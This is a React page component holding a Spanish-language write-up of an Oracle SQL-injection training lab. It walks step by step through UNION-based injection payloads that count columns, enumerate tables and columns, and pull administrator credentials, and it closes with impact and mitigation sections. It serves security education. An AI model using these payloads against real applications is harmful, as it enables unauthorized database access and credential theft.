import React from 'react';
import { SQLI_LABS } from '@/app/data/sqliLabs';

const Lab6 = () => {
  const lab = SQLI_LABS.find((l) => l.id === 'lab-06');
  if (!lab) return <div>Laboratorio no encontrado</div>;

  return (
    <section className="pt-28 pb-16 bg-black/95 min-h-screen">
      <div className="max-w-5xl mx-auto px-4 sm:px-6 lg:px-8">
        <h1 className="text-2xl sm:text-3xl font-mono text-[#d4a574] mb-6">
          {lab.title}
        </h1>

        {/* Datos generales */}
        <div className="mb-8 bg-[#1a1a1a]/40 border border-[#d4a574]/20 p-5">
          <h3 className="text-lg font-bold text-[#cc6633] mb-3">Datos generales del laboratorio</h3>
          <ul className="space-y-2 text-sm font-mono text-[#d4a574]/80">
            <li><span className="text-[#cc6633]">Nombre:</span> SQL injection attack, listing the database contents on Oracle</li>
            <li><span className="text-[#cc6633]">Nivel:</span> Practitioner</li>
            <li><span className="text-[#cc6633]">Tipo de SQLi:</span> In-band (UNION based) SQL Injection</li>
            <li><span className="text-[#cc6633]">Objetivo:</span> Identificar tablas y columnas de una base de datos Oracle para extraer credenciales y acceder como administrador.</li>
          </ul>
        </div>

        {/* Explicación técnica */}
        <h3 className="text-lg font-bold text-[#cc6633]">Explicación técnica de la vulnerabilidad</h3>
        <div className="intro text-[#d4a574] mb-6">
          El filtro de categorías de productos es vulnerable a SQL Injection, lo que permite
          inyectar comandos SQL que se ejecutan sobre una base de datos Oracle. A diferencia
          de otros motores, Oracle requiere el uso de la tabla <span className="text-[#cc6633]">dual</span>
          para ciertas pruebas de conectividad y el uso de vistas del sistema como
          <span className="text-[#cc6633]"> all_tables</span> y
          <span className="text-[#cc6633]"> all_tab_columns</span> para enumerar el esquema interno
          de la base de datos.
          <br /><br />
          La vulnerabilidad permite que los resultados de una consulta inyectada se muestren
          directamente en la página web. Esto hace posible descubrir tablas, columnas y,
          finalmente, recuperar datos sensibles como nombres de usuario y contraseñas desde
          la base de datos.
        </div>

        {/* Procedimiento */}
        <div className="space-y-6">
          <h3 className="text-lg font-bold text-[#cc6633]">Procedimiento paso a paso</h3>
          {[
            {
              title: 'Paso 1: Determinar el número de columnas',
              items: [
                "Probar con ' ORDER BY 2-- y luego con ' ORDER BY 3--.",
                'Observar que el error aparece en la tercera columna, confirmando que la consulta original utiliza 2 columnas.',
              ],
            },
            {
              title: 'Paso 2: Confirmar tipos de datos y motor Oracle',
              items: [
                "Inyectar el payload: ' UNION SELECT 'abc', 'def' FROM dual--",
                'Confirmar que ambas columnas aceptan datos tipo string y que la sintaxis con dual funciona, lo que indica que el motor es Oracle.',
              ],
            },
            {
              title: 'Paso 3: Enumerar tablas',
              items: [
                "Ejecutar: ' UNION SELECT table_name, NULL FROM all_tables--",
                'Buscar una tabla cuyo nombre sugiera que almacena usuarios.',
              ],
            },
            {
              title: 'Paso 4: Enumerar columnas',
              items: [
                "Una vez encontrada la tabla, inyectar: ' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_AAA'--",
                'Identificar los nombres de las columnas que contienen el usuario y la contraseña.',
              ],
            },
            {
              title: 'Paso 5: Extraer credenciales',
              items: [
                "Ejecutar la consulta final: ' UNION SELECT USERNAME_AAA, PASSWORD_AAA FROM USERS_AAA--",
                'Obtener el usuario administrator y su contraseña directamente desde la respuesta.',
              ],
            },
            {
              title: 'Paso 6: Acceso al sistema',
              items: [
                'Copiar la contraseña del usuario administrator.',
                'Usarla en la página de login para completar el laboratorio.',
              ],
            },
          ].map((phase, idx) => (
            <div key={idx}>
              <h4 className="text-md font-bold text-[#d4a574]">{phase.title}</h4>
              <ul className="space-y-2 pl-6 list-decimal">
                {phase.items.map((item, itemIdx) => (
                  <li key={itemIdx} className="text-sm font-mono text-[#d4a574]/75">
                    {item}
                  </li>
                ))}
              </ul>
            </div>
          ))}
        </div>

        {/* Payload */}
        <div className="mb-6 mt-8">
          <h3 className="text-lg font-bold text-[#cc6633]">Payload utilizado</h3>
          <pre className="bg-[#1a1a1a]/40 border border-[#d4a574]/20 p-4 text-[#d4a574] font-mono overflow-x-auto">
{`' UNION SELECT USERNAME_AAA, PASSWORD_AAA FROM USERS_AAA--`}
          </pre>
        </div>

        {/* Explicación del payload */}
        <div className="mb-6">
          <h3 className="text-lg font-bold text-[#cc6633]">Explicación del payload</h3>
          <div className="intro text-[#d4a574] mb-6">
            El payload final utilizado fue:
            <br /><br />
            <span className="text-[#cc6633]">' UNION SELECT USERNAME_AAA, PASSWORD_AAA FROM USERS_AAA--</span>
            <br /><br />
            <span className="text-[#cc6633]">' UNION SELECT</span>: cierra la consulta original
            y añade una nueva consulta controlada por el atacante, cuyos resultados se combinan
            con los de la página.
            <br /><br />
            <span className="text-[#cc6633]">USERNAME_AAA, PASSWORD_AAA</span>: son los nombres
            específicos de las columnas descubiertas en el paso de enumeración. Al solicitarlas
            explícitamente, la base de datos devuelve el contenido de cada fila, es decir, los
            nombres de usuario y sus contraseñas.
            <br /><br />
            <span className="text-[#cc6633]">FROM USERS_AAA</span>: indica la tabla específica
            desde la cual queremos extraer la información, previamente identificada consultando
            <span className="text-[#cc6633]"> all_tables</span>.
            <br /><br />
            Finalmente, el comentario SQL <span className="text-[#cc6633]">--</span> anula el
            resto de la consulta original. Esta técnica permite obtener datos sensibles dentro
            de la misma respuesta HTTP y representa una explotación avanzada de tipo
            <span className="text-[#cc6633]"> in-band UNION-based</span>.
          </div>
        </div>

        {/* Impacto */}
        <div className="mb-6">
          <h3 className="text-lg font-bold text-[#cc6633]">Impacto en seguridad</h3>
          <ul className="space-y-2 pl-6 list-disc text-sm font-mono text-[#d4a574]/75">
            <li><span className="text-[#cc6633]">Confidencialidad:</span> exposición directa de credenciales de usuarios almacenadas en la base de datos.</li>
            <li><span className="text-[#cc6633]">Integridad:</span> un atacante autenticado como administrador podría modificar registros, usuarios o configuraciones.</li>
            <li><span className="text-[#cc6633]">Disponibilidad:</span> el acceso privilegiado puede facilitar acciones destructivas o interrupciones sobre la aplicación y sus datos.</li>
          </ul>
        </div>

        {/* Mitigación */}
        <div className="mb-6">
          <h3 className="text-lg font-bold text-[#cc6633]">Mitigación recomendada</h3>
          <div className="intro text-[#d4a574] mb-6">
            La solución principal es el uso de consultas parametrizadas, lo que impide que
            nombres de tablas, columnas o valores inyectados por el usuario sean interpretados
            como parte del comando SQL ejecutable.
            <br /><br />
            También se recomienda aplicar el principio de mínimo privilegio, asegurando que
            la cuenta de base de datos utilizada por la aplicación no tenga permisos de lectura
            sobre vistas del sistema como <span className="text-[#cc6633]">all_tables</span> o
            <span className="text-[#cc6633]"> all_tab_columns</span>, limitando así la capacidad
            de un atacante para enumerar y explotar el contenido interno de la base de datos.
          </div>
        </div>

        {/* Evidencias */}
        <div className="mb-6">
          <h3 className="text-lg font-bold text-[#cc6633]">Evidencias</h3>
          <p className="text-sm font-mono text-[#d4a574]/65 mb-4">
            Coloca aquí las capturas correspondientes al request interceptado, payload utilizado,
            respuesta vulnerable y confirmación del laboratorio resuelto.
          </p>

          {/* Captura 1 */}
          <div className="mb-6">
            <p className="text-sm font-mono text-[#d4a574]/65 mb-2">
              Figura 1. Request interceptado en Burp Suite.
            </p>
            <img
              src={`${import.meta.env.BASE_URL}images/sqli/lab06-request.png`}
              alt="Lab 6 request interceptado"
              className="w-full max-w-4xl border border-[#d4a574]/20"
            />
          </div>

          {/* Captura 2 */}
          <div className="mb-6">
            <p className="text-sm font-mono text-[#d4a574]/65 mb-2">
              Figura 2. Payload utilizado para enumerar y extraer credenciales.
            </p>
            <img
              src={`${import.meta.env.BASE_URL}images/sqli/lab06-payload.png`}
              alt="Lab 6 payload"
              className="w-full max-w-4xl border border-[#d4a574]/20"
            />
          </div>

          {/* Captura 3 */}
          <div className="mb-6">
            <p className="text-sm font-mono text-[#d4a574]/65 mb-2">
              Figura 3. Respuesta vulnerable mostrando usuarios y contraseñas.
            </p>
            <img
              src={`${import.meta.env.BASE_URL}images/sqli/lab06-response.png`}
              alt="Lab 6 respuesta vulnerable"
              className="w-full max-w-4xl border border-[#d4a574]/20"
            />
          </div>

          {/* Captura 4 */}
          <div>
            <p className="text-sm font-mono text-[#d4a574]/65 mb-2">
              Figura 4. Confirmación de “Lab Solved”.
            </p>
            <img
              src={`${import.meta.env.BASE_URL}images/sqli/lab06-solved.png`}
              alt="Lab 6 laboratorio resuelto"
              className="w-full max-w-4xl border border-[#d4a574]/20"
            />
          </div>
        </div>

        {/* Referencias */}
        <div className="references">
          <h3 className="text-lg font-bold text-[#cc6633]">Referencias</h3>
          <ul className="space-y-2">
            {lab.references.map((r, idx) => (
              <li key={idx} className="text-sm font-mono text-[#d4a574]/75">
                <span className="text-[#cc6633]">› </span>
                <span className="text-[#d4a574]">{r.label}:</span> {r.value}
              </li>
            ))}
          </ul>
        </div>
      </div>
    </section>
  );
};

export default Lab6;